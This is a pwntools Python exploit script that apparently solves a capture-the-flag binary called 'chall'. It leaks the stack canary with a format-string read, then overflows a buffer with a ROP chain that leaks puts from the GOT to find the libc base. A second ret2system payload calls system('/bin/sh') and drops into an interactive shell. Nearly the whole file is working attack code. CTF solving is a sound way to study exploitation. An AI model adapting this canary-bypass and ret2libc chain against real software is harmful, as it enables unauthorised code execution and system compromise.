from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './chall'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

offset = 56  # Canary offset

# Lib-C library
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local
# libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so')  # Remote

pop_rdi = 0x40143b

# Leak canary value (34th on stack)
io.sendlineafter(b'>', b'1')
io.sendlineafter(b':', b'1')
io.sendlineafter(b':', '%{}$p'.format(33).encode())
io.recv(1)
canary = int(io.recvline().strip(), 16)
info('canary = 0x%x (%d)', canary, canary)

# Build payload (leak puts)
payload = flat([
    offset * b'A',  # Pad to canary (56)
    canary,  # Our leaked canary (8)
    8 * b'A',  # Pad to Ret pointer (8)
    # Leak got.puts
    pop_rdi,
    elf.got.puts,
    elf.plt.puts,
    elf.symbols.drink  # Return for 2nd payload
])

# Send the payload
io.sendlineafter(b'>', b'2')
io.sendline(payload)

# Retrieve got.puts address
io.recvlines(5)
got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# Build payload (ret2system)
payload = flat([
    offset * b'A',  # Pad to canary (56)
    canary,  # Our leaked canary (8)
    8 * b'A',  # Pad to Ret pointer (8)
    # Ret2system
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),
    libc.symbols.system
])

# Send the payload
io.sendline(payload)

# Get our flag/shell
io.interactive()
